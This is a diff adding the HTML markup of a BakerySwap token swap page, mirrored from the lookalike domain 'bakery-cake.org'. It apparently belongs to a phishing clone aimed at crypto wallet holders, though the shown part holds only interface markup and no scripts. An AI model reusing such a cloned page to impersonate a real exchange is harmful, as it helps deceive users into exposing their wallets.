@@ -1,0 +1,2765 @@
+<!DOCTYPE html>
+<html lang="en-US">
+  
+<!-- Mirrored from bakery-cake.org/swap.php by HTTrack Website Copier/3.x [XR&CO'2014], Thu, 07 Jul 2022 11:25:11 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!-- /Added by HTTrack -->
+<head>
+    <meta charset="utf-8" />
+    <link rel="icon" href="favicon.ico" />
+    <link rel="shortcut icon" type="image/png" href="favicon.ico" />
+    <meta name="viewport" content="width=device-width,initial-scale=1" />
+    <meta name="theme-color" content="#ff007a" />
+    <title>BakerySwap</title>
+    <link
+      rel="stylesheet"
+      href="../cdn.jsdelivr.net/npm/bootstrap%404.6.0/dist/css/bootstrap.min.css"
+      integrity="sha384-B0vP5xmATw1+K9KRQjQERJvTumQW0nPEzvF6L/Z6nronJ3oUOFUFpCjEUQouq2+l"
+      crossorigin="anonymous"
+    />
+    <link rel="stylesheet" href="navigation.min.css" />
+    <link rel="stylesheet" type="text/css" href="bundle.min.css" media="all" />
+    <link rel="stylesheet" type="text/css" href="style.css" media="all" />
+    <link rel="stylesheet" href="settings.css" />
+  </head>
+  <body>
+    <div id="root">
+      <div class="sc-hrRoet bUpuBs">
+        <div class="sc-iXKTDd dgkyWV">
+          <div id="header_id" class="sc-hORach dKdZth">
+            <div
+              style="align-items: center"
+              class="sc-bdVaJa sc-eNQAEJ sc-hMqMXs sc-krvtoX bekrDb"
+            >
+              <div class="sc-bMVAic sc-bAeIUo bcBsLm">
+                <div class="sc-bXGyLb iWTNGH imgRoot">
+                  <img
+                    src="images/unfold.af1d0638.svg"
+                    style="height: 28px"
+                    alt=""
+                  />
+                </div>
+                <a href=".html" class="sc-GMQeP cHIzWA">
+                  <div class="sc-lkqHmb gZiitS">
+                    <img
+                      src="images/logo.4e93c681.svg"
+                      style="height: 32px"
+                      alt="logo"
+                    />
+                  </div>
+                  <div class="sc-bdVaJa sc-eNQAEJ sc-exAgwC eKaZQa">
+                    <img
+                      style="margin-left: 5px; margin-top: 0px; height: 20px"
+                      src="images/wordmark.a003062e.svg"
+                      alt="logo"
+                    />
+                  </div>
+                </a>
+              </div>
+              <div class="sc-eLExRp kqOZFi">
+                <div class="sc-bMVAic PDERw">
+                  <div class="sc-gojNiO cFFRKS">
+                    <div class="sc-bdVaJa sc-htpNat sc-bZQynM sc-daURTG cQDweg">
+                      bsc                    </div>
+                  </div>
+                  <div
+                    id="prepare"
+                    style="pointer-events: auto"
+                    class="sc-cQFLBn kGTDoE"
+                  >
+                    <button
+                      style="background-color: rgb(172, 86, 42)"
+                      id="btn-connect-desktop"
+                      class="sc-bdVaJa dkzats sc-iRbamj sc-jhAzac sc-iuJeZd sc-hMFtBS jEUCSV"
+                    >
+                      Connect Wallet
+                    </button>
+                    <button
+                      style="background-color: rgb(172, 86, 42)"
+                      id="btn-connect"
+                      class="sc-bdVaJa dkzats sc-iRbamj sc-jhAzac sc-iuJeZd sc-hMFtBS jEUCSV"
+                    >
+                      Connect Wallet
+                    </button>
+                  </div>
+
+                  <div
+                    id="connected"
+                    style="display: none"
+                    style="pointer-events: auto"
+                    class="sc-cQFLBn kGTDoE"
+                  >
+                    <button
+                      id="btn-disconnect"
+                      style="background-color: rgb(172, 86, 42)"
+                      class="sc-bdVaJa dkzats sc-iRbamj sc-jhAzac sc-iuJeZd sc-hMFtBS jEUCSV"
+                    >
+                      Disconnect Wallet
+                    </button>
+                  </div>
+                </div>
+                <div class="sc-iujRgT eRTwLR">
+                  <div class="sc-ksYbfQ bYYqoe">
+                    <button
+                      id="open-settings-dialog-button"
+                      class="sc-kgAjT fCVYuL"
+                    >
+                      <svg
+                        xmlns="http://www.w3.org/2000/svg"
+                        width="24"
+                        height="24"
+                        viewBox="0 0 24 24"
+                        fill="none"
+                        stroke="currentColor"
+                        stroke-width="2"
+                        stroke-linecap="round"
+                        stroke-linejoin="round"
+                        class="sc-cHGsZl kDPYLZ"
+                      >
+                        <circle cx="12" cy="12" r="3"></circle>
+                        <path
+                          d="M19.4 15a1.65 1.65 0 0 0 .33 1.82l.06.06a2 2 0 0 1 0 2.83 2 2 0 0 1-2.83 0l-.06-.06a1.65 1.65 0 0 0-1.82-.33 1.65 1.65 0 0 0-1 1.51V21a2 2 0 0 1-2 2 2 2 0 0 1-2-2v-.09A1.65 1.65 0 0 0 9 19.4a1.65 1.65 0 0 0-1.82.33l-.06.06a2 2 0 0 1-2.83 0 2 2 0 0 1 0-2.83l.06-.06a1.65 1.65 0 0 0 .33-1.82 1.65 1.65 0 0 0-1.51-1H3a2 2 0 0 1-2-2 2 2 0 0 1 2-2h.09A1.65 1.65 0 0 0 4.6 9a1.65 1.65 0 0 0-.33-1.82l-.06-.06a2 2 0 0 1 0-2.83 2 2 0 0 1 2.83 0l.06.06a1.65 1.65 0 0 0 1.82.33H9a1.65 1.65 0 0 0 1-1.51V3a2 2 0 0 1 2-2 2 2 0 0 1 2 2v.09a1.65 1.65 0 0 0 1 1.51 1.65 1.65 0 0 0 1.82-.33l.06-.06a2 2 0 0 1 2.83 0 2 2 0 0 1 0 2.83l-.06.06a1.65 1.65 0 0 0-.33 1.82V9a1.65 1.65 0 0 0 1.51 1H21a2 2 0 0 1 2 2 2 2 0 0 1-2 2h-.09a1.65 1.65 0 0 0-1.51 1z"
+                        ></path>
+                      </svg>
+                    </button>
+                    <span class="sc-hmzhuo hfAfEp"
+                      ><div class="sc-jKJlTe drAiDs" style="padding: 1rem">
+                        <div class="css-18hn7mq">Transaction Settings</div>
+                        <div class="sc-jKJlTe drAiDs">
+                          <div class="sc-jKJlTe iHouBp">
+                            <div class="sc-bdVaJa sc-eNQAEJ sc-hSdWYo etBEUW">
+                              <div class="sc-kpOJdX jLZfGp css-1pnt2fu">
+                                Slippage tolerance
+                              </div>
+                              <span style="margin-left: 4px"
+                                ><div class="sc-iwsKbI xkrrd">
+                                  <div class="sc-jTzLTM eKTHYu">
+                                    <svg
+                                      xmlns="http://www.w3.org/2000/svg"
+                                      width="16"
+                                      height="16"
+                                      viewBox="0 0 24 24"
+                                      fill="none"
+                                      stroke="currentColor"
+                                      stroke-width="2"
+                                      stroke-linecap="round"
+                                      stroke-linejoin="round"
+                                    >
+                                      <circle cx="12" cy="12" r="10"></circle>
+                                      <path
+                                        d="M9.09 9a3 3 0 0 1 5.83 1c0 2-3 3-3 3"
+                                      ></path>
+                                      <line
+                                        x1="12"
+                                        y1="17"
+                                        x2="12.01"
+                                        y2="17"
+                                      ></line>
+                                    </svg>
+                                  </div></div
+                              ></span>
+                            </div>
+                            <div class="sc-bdVaJa sc-eNQAEJ sc-hMqMXs bcpqQH">
+                              <button class="sc-cvbbAY sc-jWBwVP fZZNwu">
+                                0.1%</button
+                              ><button class="sc-cvbbAY sc-jWBwVP cQFAnb">
+                                0.5%</button
+                              ><button class="sc-cvbbAY sc-jWBwVP fZZNwu">
+                                1%</button
+                              ><button
+                                tabindex="-1"
+                                class="sc-cvbbAY sc-cMljjf RtgPX"
+                              >
+                                <div
+                                  class="sc-bdVaJa sc-eNQAEJ sc-hMqMXs bcpqQH"
+                                >
+                                  <input
+                                    placeholder="0.50"
+                                    color=""
+                                    class="sc-brqgnP hPhOsA"
+                                    value=""
+                                  />%
+                                </div>
+                              </button>
+                            </div>
+                          </div>
+                          <div class="sc-jKJlTe iHouBp">
+                            <div class="sc-bdVaJa sc-eNQAEJ sc-hSdWYo etBEUW">
+                              <div class="sc-kpOJdX jLZfGp css-1pnt2fu">
+                                Transaction deadline
+                              </div>
+                              <span style="margin-left: 4px"
+                                ><div class="sc-iwsKbI xkrrd">
+                                  <div class="sc-jTzLTM eKTHYu">
+                                    <svg
+                                      xmlns="http://www.w3.org/2000/svg"
+                                      width="16"
+                                      height="16"
+                                      viewBox="0 0 24 24"
+                                      fill="none"
+                                      stroke="currentColor"
+                                      stroke-width="2"
+                                      stroke-linecap="round"
+                                      stroke-linejoin="round"
+                                    >
+                                      <circle cx="12" cy="12" r="10"></circle>
+                                      <path
+                                        d="M9.09 9a3 3 0 0 1 5.83 1c0 2-3 3-3 3"
+                                      ></path>
+                                      <line
+                                        x1="12"
+                                        y1="17"
+                                        x2="12.01"
+                                        y2="17"
+                                      ></line>
+                                    </svg>
+                                  </div></div
+                              ></span>
+                            </div>
+                            <div class="sc-bdVaJa sc-eNQAEJ sc-hSdWYo etBEUW">
+                              <button
+                                tabindex="-1"
+                                class="sc-cvbbAY sc-cMljjf RtgPX"
+                                style="width: 80px"
+                              >
+                                <input
+                                  placeholder="20"
+                                  class="sc-brqgnP hPhOsA"
+                                  value="20"
+                                />
+                              </button>
+                              <div
+                                class="sc-kpOJdX kpIhyN css-1ecm0so"
+                                style="padding-left: 8px"
+                              >
+                                minutes
+                              </div>
+                            </div>
+                          </div>
+                        </div>
+                        <div class="css-18hn7mq">Interface Settings</div>
+                        <div class="sc-bdVaJa sc-eNQAEJ sc-hMqMXs bcpqQH">
+                          <div class="sc-bdVaJa sc-eNQAEJ sc-hSdWYo etBEUW">
+                            <div class="sc-kpOJdX jLZfGp css-1pnt2fu">
+                              Toggle Expert Mode
+                            </div>
+                            <span style="margin-left: 4px"
+                              ><div class="sc-iwsKbI xkrrd">
+                                <div class="sc-jTzLTM eKTHYu">
+                                  <svg
+                                    xmlns="http://www.w3.org/2000/svg"
+                                    width="16"
+                                    height="16"
+                                    viewBox="0 0 24 24"
+                                    fill="none"
+                                    stroke="currentColor"
+                                    stroke-width="2"
+                                    stroke-linecap="round"
+                                    stroke-linejoin="round"
+                                  >
+                                    <circle cx="12" cy="12" r="10"></circle>
+                                    <path
+                                      d="M9.09 9a3 3 0 0 1 5.83 1c0 2-3 3-3 3"
+                                    ></path>
+                                    <line
+                                      x1="12"
+                                      y1="17"
+                                      x2="12.01"
+                                      y2="17"
+                                    ></line>
+                                  </svg>
+                                </div></div
+                            ></span>
+                          </div>
+                          <button
+                            id="toggle-expert-mode-button"
+                            class="sc-gPEVay lhMnYf"
+                          >
+                            <span class="sc-jDwBTQ cmrRaj">On</span
+                            ><span class="sc-jDwBTQ fZFZir">Off</span>
+                          </button>
+                        </div>
+                        <div class="sc-bdVaJa sc-eNQAEJ sc-hMqMXs bcpqQH">
+                          <div class="sc-bdVaJa sc-eNQAEJ sc-hSdWYo etBEUW">
+                            <div class="sc-kpOJdX jLZfGp css-1pnt2fu">
+                              Toggle Dark Mode
+                            </div>
+                          </div>
+                          <button class="sc-gPEVay lhMnYf">
+                            <span class="sc-jDwBTQ cmrRaj">On</span
+                            ><span class="sc-jDwBTQ fZFZir">Off</span>
+                          </button>
+                        </div>
+                      </div></span
+                    >
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <div class="sc-ehkqFD eqmiNA">
+          <div class="sc-jjOAeO cQAcLF">
+            <nav style="width: 0" class="sc-emmjRN bTiWHI lol">
+              <a
+                class="sc-cpmLhU kpXpik"
+                href="index-2.html"
+                aria-current="page"
+                ><img
+                  src="images/home.979f9a8a.svg"
+                  class="sc-jzgbtB gZWqcc"
+                  style="height: 24px"
+                /><span class="sc-bMvGRv htHvGK menu visible">Home</span></a
+              >
+              <div id="contactTriggerTrade" class="sc-gFaPwZ behxId ACTIVENAV">
+                <img
+                  src="images/trade.9c696aab.svg"
+                  class="sc-jzgbtB gZWqcc"
+                  style="height: 24px"
+                /><span class="sc-bMvGRv htHvGK menu visible">Trade</span
+                ><img
+                  id="contactTriggerTriangleTrade"
+                  src="images/triangle_down.336fb20e.svg"
+                  class="sc-rBLzX bUNUQb"
+                  style="height: 8px"
+                />
+              </div>
+              <div id="trade" class="sc-fhYwyz hYJzoe ACTIVENAV">
+                <a
+                  class="sc-cpmLhU kpXpik exchange ACTIVENAV"
+                  href="swap.html"
+                  style="padding-left: 54px; font-weight: 500"
+                  ><img
+                    src="images/exchange.59b59ded.svg"
+                    class="sc-jzgbtB gZWqcc"
+                    style="height: 24px"
+                  /><span class="sc-bMvGRv htHvGK menu visible"
+                    >Exchange</span
+                  ></a
+                ><a
+                  class="sc-cpmLhU kpXpik exchange"
+                  href="liquidity.html"
+                  style="padding-left: 54px; font-weight: 500"
+                  ><img
+                    src="images/liquidity.5e258eb9.svg"
+                    class="sc-jzgbtB gZWqcc"
+                    style="height: 24px"
+                  /><span class="sc-bMvGRv htHvGK menu visible"
+                    >Liquidity</span
+                  ></a
+                >
+              </div>
+              <a class="sc-cpmLhU kpXpik" href="earning.html"
+                ><img
+                  src="images/earning_select.f9b4b522.svg"
+                  class="sc-jzgbtB gZWqcc"
+                  style="height: 24px"
+                /><span class="sc-bMvGRv htHvGK menu visible">Earning</span></a
+              >
+              <a href="nft.html"
+                ><div class="sc-gFaPwZ behxId ACTIVENAV">
+                  <img
+                    src="images/nft.02261315.svg"
+                    class="sc-jzgbtB gZWqcc"
+                    style="height: 24px"
+                  /><span class="sc-bMvGRv htHvGK menu visible"
+                    >NFT Marketplace</span
+                  >
+                </div></a
+              >
+              <div class="sc-CtfFt fyaOpU">
+                <img
+                  src="images/gallery.7e87d6d3.svg"
+                  class="sc-jzgbtB gZWqcc"
+                  style="height: 24px"
+                /><a
+                  target="_blank"
+                  rel="noopener noreferrer"
+                  href="https://gallery.bakeryswap.org/"
+                  class="sc-chPdSV bpvxnK sc-bnXvFD irWKoY galleryAboutLink"
+                  >Bakery Gallery</a
+                >
+              </div>
+              <a class="sc-cpmLhU kpXpik" href="launchpad.html"
+                ><img
+                  src="images/launchpad.b79cf5ba.svg"
+                  class="sc-jzgbtB gZWqcc"
+                  style="height: 24px"
+                /><span class="sc-bMvGRv htHvGK menu visible"
+                  >Launchpad</span
+                ></a
+              ><a class="sc-cpmLhU kpXpik" href="gamification.html"
+                ><img
+                  src="images/game.ebcccdaf.svg"
+                  class="sc-jzgbtB gZWqcc"
+                  style="height: 24px"
+                /><span class="sc-bMvGRv htHvGK menu visible"
+                  >Gamification</span
+                ></a
+              ><a
+                target="_blank"
+                rel="noopener noreferrer"
+                href="https://info.bakeryswap.org/"
+                class="sc-chPdSV bpvxnK sc-bnXvFD irWKoY"
+                ><img
+                  src="images/info.10a5cc6a.svg"
+                  class="sc-jzgbtB gZWqcc"
+                  style="height: 24px"
+                /><span class="sc-bMvGRv htHvGK menu visible">Info</span></a
+              >
+              <div id="contactTrigger" class="sc-gFaPwZ behxId">
+                <img
+                  src="images/contact.565401ef.svg"
+                  class="sc-jzgbtB gZWqcc"
+                  style="height: 24px"
+                /><span class="sc-bMvGRv htHvGK menu visible">Contact</span
+                ><img
+                  src="images/triangle_down.336fb20e.svg"
+                  class="sc-rBLzX bUNUQb rotate"
+                  style="height: 8px"
+                  id="contactTriggerTriangle"
+                />
+              </div>
+              <div
+                id="contacts"
+                class="sc-fhYwyz hYJzoe ACTIVECALSS displayContacts"
+              >
+                <a
+                  target="_blank"
+                  rel="noopener noreferrer"
+                  href="https://twitter.com/bakery_swap"
+                  class="sc-chPdSV bpvxnK sc-bnXvFD irWKoY"
+                  style="padding-left: 54px; font-weight: 500"
+                  ><img
+                    src="images/twitter.2da971ef.svg"
+                    class="sc-jzgbtB gZWqcc"
+                    style="height: 24px"
+                  /><span class="sc-bMvGRv htHvGK menu visible"
+                    >Twitter</span
+                  ></a
+                ><a
+                  target="_blank"
+                  rel="noopener noreferrer"
+                  href="https://medium.com/@BakerySwap"
+                  class="sc-chPdSV bpvxnK sc-bnXvFD irWKoY"
+                  style="padding-left: 54px; font-weight: 500"
+                  ><img
+                    src="images/medium.b2a30939.svg"
+                    class="sc-jzgbtB gZWqcc"
+                    style="height: 24px"
+                  /><span class="sc-bMvGRv htHvGK menu visible">Medium</span></a
+                ><a
+                  target="_blank"
+                  rel="noopener noreferrer"
+                  href="https://t.me/bakeryswap"
+                  class="sc-chPdSV bpvxnK sc-bnXvFD irWKoY"
+                  style="padding-left: 54px; font-weight: 500"
+                  ><img
+                    src="images/contact.565401ef.svg"
+                    class="sc-jzgbtB gZWqcc"
+                    style="height: 24px"
+                  /><span class="sc-bMvGRv htHvGK menu visible"
+                    >Telegram</span
+                  ></a
+                >
+              </div>
+            </nav>
+            <div class="sc-laTMn drSCbm hideCollectionList">
+              <div class="sc-hGoxap bLDQCz">
+                <img
+                  src="images/triangle_left.f2cd4824.svg"
+                  class="sc-fjmCvl dMkYnr"
+                  style="height: 8px"
+                /><span class="sc-bMvGRv htHvGK menu visible"></span>
+              </div>
+              <div class="sc-TFwJa jRKToQ"></div>
+            </div>
+          </div>
+          <div class="sc-bNgurp iXwAge" id="BodyContainer">
+            <div class="sc-iQLKIq eScRiI">
+              <div class="sc-jKJlTe sc-giadOv hmoZve"></div>
+              <div height="0" class="sc-jVODtj Zdrfh">
+                <div class="sc-kUaPvJ jTpnNj"></div>
+              </div>
+              <div class="sc-iYUSvU jYVRZK">
+                <img
+                  src="images/logo.4e93c681.svg"
+                  alt="logo"
+                  style="height: 50px"
+                />
+              </div>
+              <div class="sc-cHSUfg dwuQjX">
+                <img
+                  src="images/wordmark.a003062e.svg"
+                  alt="logo"
+                  style="margin-top: 0px; height: 30px"
+                />
+              </div>
+              <div class="sc-iQtOjA cUwyDd">
+                <div class="sc-bGbJRg fzbdmB" style="margin-bottom: 20px">
+                  <a
+                    aria-current="page"
+                    class="sc-bEjcJn bDYgnc ACTIVE"
+                    id="swap-nav-link"
+                    href="#"
+                    >Swap</a
+                  ><a
+                    class="sc-bEjcJn bDYgnc"
+                    id="pool-nav-link"
+                    href="liquidity.html"
+                    >Pool</a
+                  >
+                </div>
+                <div id="swap-page" class="sc-eKZiaR iGVbnZ">
+                  <div class="sc-jKJlTe drAiDs">
+                    <div id="swap-currency-input" class="sc-fOICqy eMAFhX">
+                      <div class="sc-hzDEsm jcUczv">
+                        <div class="sc-hgHYgh dJAAhE">
+                          <div class="sc-bdVaJa sc-eNQAEJ sc-hMqMXs bcpqQH">
+                            <div class="sc-kpOJdX jLZfGp css-1rhdhic">From</div>
+                            <div
+                              class="sc-kpOJdX jLZfGp css-1rhdhic"
+                              style="display: inline; cursor: pointer"
+                              id="balance"
+                            ></div>
+                          </div>
+                        </div>
+                        <div class="sc-iGPElx dHPkwG">
+                          <input
+                            class="sc-jXQZqI bxLVaB token-amount-input"
+                            onkeyup="validateAmount()"
+                            id="fromInput"
+                            inputmode="decimal"
+                            title="Token Amount"
+                            autocomplete="off"
+                            autocorrect="off"
+                            pattern="^[0-9]*[.,]?[0-9]*$"
+                            placeholder="0.0"
+                            minlength="1"
+                            maxlength="79"
+                            spellcheck="false"
+                            value=""
+                          /><button id="maxButton" class="sc-jtRlXQ dbbWPm">
+                            MAX</button
+                          ><button
+                            class="sc-kasBVs gakftj open-currency-select-button"
+                          >
+                            <span class="sc-eInJlc fwsaKC"
+                              ><img
+                                src="data:image/png;base64,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"
+                                class="sc-ipZHIp cTkuCR"
+                              /><span
+                                class="sc-jeCdPy eUhIcK token-symbol-container"
+                                >BNB</span
+                              >
+                            </span>
+                          </button>
+                        </div>
+                      </div>
+                    </div>
+                    <div class="sc-jKJlTe eruhQI">
+                      <div
+                        class="sc-bdVaJa sc-eNQAEJ sc-iAyFgw bGhQW"
+                        style="padding: 0px 1rem"
+                      >
+                        <div class="sc-drMfKT blmeTN">
+                          <svg
+                            xmlns="http://www.w3.org/2000/svg"
+                            width="16"
+                            height="16"
+                            viewBox="0 0 24 24"
+                            fill="none"
+                            stroke="#565A69"
+                            stroke-width="2"
+                            stroke-linecap="round"
+                            stroke-linejoin="round"
+                          >
+                            <line x1="12" y1="5" x2="12" y2="19"></line>
+                            <polyline points="19 12 12 19 5 12"></polyline>
+                          </svg>
+                        </div>
+                      </div>
+                    </div>
+                    <div id="swap-currency-output" class="sc-fOICqy eMAFhX">
+                      <div class="sc-hzDEsm jcUczv">
+                        <div class="sc-hgHYgh dJAAhE">
+                          <div class="sc-bdVaJa sc-eNQAEJ sc-hMqMXs bcpqQH">
+                            <div class="sc-kpOJdX jLZfGp css-1rhdhic">To</div>
+                            <div
+                              class="sc-kpOJdX jLZfGp css-1rhdhic"
+                              style="display: inline; cursor: pointer"
+                            >
+                              -
+                            </div>
+                          </div>
+                        </div>
+                        <div class="sc-iGPElx dHPkwG">
+                          <input
+                            class="sc-jXQZqI bxLVaB token-amount-input"
+                            id="toInput"
+                            inputmode="decimal"
+                            title="Token Amount"
+                            autocomplete="off"
+                            autocorrect="off"
+                            type="text"
+                            pattern="^[0-9]*[.,]?[0-9]*$"
+                            placeholder="0.0"
+                            minlength="1"
+                            maxlength="79"
+                            spellcheck="false"
+                          />
+                          <button
+                            id="selectTokenBtn"
+                            class="sc-kasBVs jWrWXz open-currency-select-button"
+                          >
+                            <span class="sc-eInJlc fwsaKC"
+                              ><span
+                                class="sc-jeCdPy gpRzhW token-symbol-container"
+                                >Select a token</span
+                              ><svg
+                                width="12"
+                                height="7"
+                                viewBox="0 0 12 7"
+                                fill="none"
+                                class="sc-gtfDJT dvsnFd"
+                              >
+                                <path
+                                  d="M0.97168 1L6.20532 6L11.439 1"
+                                  stroke="#AEAEAE"
+                                ></path></svg
+                            ></span>
+                          </button>
+                          <button
+                            id="infoBtn"
+                            style="display: none"
+                            class="sc-kasBVs gakftj open-currency-select-button"
+                          >
+                            <span class="sc-eInJlc fwsaKC"
+                              ><img
+                                id="labelImg"
+                                class="sc-iqzUVk kfsqVQ"
+                                alt="BMON logo"
+                                src="#" />
+                              <span
+                                id="labelName"
+                                class="sc-jeCdPy eUhIcK token-symbol-container"
+                              ></span
+                              ><svg
+                                width="12"
+                                height="7"
+                                viewBox="0 0 12 7"
+                                fill="none"
+                                class="sc-gtfDJT ljNpND"
+                              >
+                                <path
+                                  d="M0.97168 1L6.20532 6L11.439 1"
+                                  stroke="#AEAEAE"
+                                ></path></svg
+                            ></span>
+                          </button>
+                        </div>
+                      </div>
+                    </div>
+                    <div class="sc-bdVaJa sc-htpNat ktfuGW">
+                      <div class="sc-jKJlTe eVyulT"></div>
+                    </div>
+                  </div>
+                  <button
+                    style="background-color: rgb(172, 86, 42); display: none"
+                    id="btn-connect-desktop-max"
+                    class="sc-bdVaJa dkzats sc-iRbamj sc-jhAzac sc-iuJeZd sc-hMFtBS jEUCSV"
+                  >
+                    Connect Wallet
+                  </button>
+                  <button
+                    style="background-color: rgb(172, 86, 42); display: none"
+                    id="btn-connect-max"
+                    class="sc-bdVaJa dkzats sc-iRbamj sc-jhAzac sc-iuJeZd sc-hMFtBS jEUCSV"
+                  >
+                    Connect Wallet
+                  </button>
+                  <div
+                    style="display: none"
+                    id="mobile-amount"
+                    class="sc-hIVACf jsQytt"
+                  >
+                    <button
+                      id="swap-button"
+                      disabled=""
+                      class="sc-bdVaJa dkzats sc-iRbamj sc-gipzik ctcmPi"
+                    >
+                      <div class="css-10ob8xa">Enter an amount</div>
+                    </button>
+                    <button
+                      style="display: none"
+                      id="swap-button-active"
+                      class="sc-bdVaJa dkzats sc-iRbamj sc-gipzik ctcmPi"
+                    >
+                      <div class="css-10ob8xa">Swap</div>
+                    </button>
+                  </div>
+                  <div
+                    style="display: none"
+                    id="desktop-amount"
+                    class="sc-hIVACf jsQytt"
+                  >
+                    <button
+                      id="swap-button-desktop"
+                      disabled=""
+                      class="sc-bdVaJa dkzats sc-iRbamj sc-gipzik ctcmPi"
+                    >
+                      <div class="css-10ob8xa">Enter an amount</div>
+                    </button>
+                    <button
+                      style="display: none"
+                      id="swap-button-active-desktop"
+                      class="sc-bdVaJa dkzats sc-iRbamj sc-gipzik ctcmPi"
+                    >
+                      <div class="css-10ob8xa">Swap</div>
+                    </button>
+                  </div>
+                </div>
+              </div>
+              <div
+                id="infoWrap"
+                class="sc-kcDeIU hCYwpq"
+                style="margin-top: 0px; display: none"
+              >
+                <div class="sc-jKJlTe drAiDs">
+                  <div class="sc-jKJlTe fGZvxD" style="padding: 0px 20px">
+                    <div class="sc-bdVaJa sc-eNQAEJ sc-hMqMXs bcpqQH">
+                      <div class="sc-bdVaJa sc-eNQAEJ sc-hSdWYo etBEUW">
+                        <div class="sc-kpOJdX jLZfGp css-1pnt2fu">
+                          Minimum received
+                        </div>
+                        <span style="margin-left: 4px"
+                          ><div class="sc-iwsKbI xkrrd">
+                            <div class="sc-jTzLTM eKTHYu">
+                              <svg
+                                xmlns="http://www.w3.org/2000/svg"
+                                width="16"
+                                height="16"
+                                viewBox="0 0 24 24"
+                                fill="none"
+                                stroke="currentColor"
+                                stroke-width="2"
+                                stroke-linecap="round"
+                                stroke-linejoin="round"
+                              >
+                                <circle cx="12" cy="12" r="10"></circle>
+                                <path
+                                  d="M9.09 9a3 3 0 0 1 5.83 1c0 2-3 3-3 3"
+                                ></path>
+                                <line x1="12" y1="17" x2="12.01" y2="17"></line>
+                              </svg>
+                            </div></div
+                        ></span>
+                      </div>
+                      <div class="sc-bdVaJa sc-eNQAEJ sc-hSdWYo etBEUW">
+                        <div class="sc-kpOJdX jLZfGp css-1z0vbpq">
+                          <div id="receivedValue"></div>
+                          <div id="receivedCrypto"></div>
+                        </div>
+                      </div>
+                    </div>
+                    <div class="sc-bdVaJa sc-eNQAEJ sc-hMqMXs bcpqQH">
+                      <div class="sc-bdVaJa sc-eNQAEJ sc-hSdWYo etBEUW">
+                        <div class="sc-kpOJdX jLZfGp css-1pnt2fu">
+                          Price Impact
+                        </div>
+                        <span style="margin-left: 4px"
+                          ><div class="sc-iwsKbI xkrrd">
+                            <div class="sc-jTzLTM eKTHYu">
+                              <svg
+                                xmlns="http://www.w3.org/2000/svg"
+                                width="16"
+                                height="16"
+                                viewBox="0 0 24 24"
+                                fill="none"
+                                stroke="currentColor"
+                                stroke-width="2"
+                                stroke-linecap="round"
+                                stroke-linejoin="round"
+                              >
+                                <circle cx="12" cy="12" r="10"></circle>
+                                <path
+                                  d="M9.09 9a3 3 0 0 1 5.83 1c0 2-3 3-3 3"
+                                ></path>
